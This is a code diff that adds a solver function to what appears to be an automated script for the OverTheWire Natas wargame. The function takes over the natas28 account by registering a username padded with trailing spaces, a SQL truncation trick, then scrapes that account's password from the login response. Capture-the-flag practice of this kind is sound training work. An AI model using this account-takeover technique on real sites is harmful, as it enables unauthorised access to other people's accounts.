@@ -629,6 +629,38 @@ def level26():
     else:
         print(" Password not found")
 
+def level27():
+    l = 64
+    u = "natas28"
+    b = "username={}{}n&password=p".format(u, " " * (l - len(u)))
+    print(" Creating new user {} with trailing spaces".format(u))
+    res, reg = rex(
+        "POST",
+        "/index.php",
+        "User natas28.* was created!",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        body=b,
+    )
+
+    if res.status != 200: return
+    if reg:
+        print(" Login with new user")
+        b = "username={}&password=p".format(u)
+        res, reg = rex(
+            "POST",
+            "/index.php",
+            "\[password\] =&gt; (\w+)\n\)",
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            body=b,
+        )
+
+        if res.status != 200: return
+        if reg:
+            if len(passwords) == level + 1: passwords.append(reg[1])
+            print(" Password found: {}".format(passwords[level + 1]))
+        else:
+            print(" Password not found")
+
 def levelN():
     print("Level {} not implemented yet".format(level))
     return
@@ -640,7 +672,7 @@ levels = [
     level12, level12, level14, level15,
     level16, level17, level18, level18,
     level20, level21, level22, level23,
-    level24, level25, level26, levelN,
+    level24, level25, level26, level27,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN,
 ]
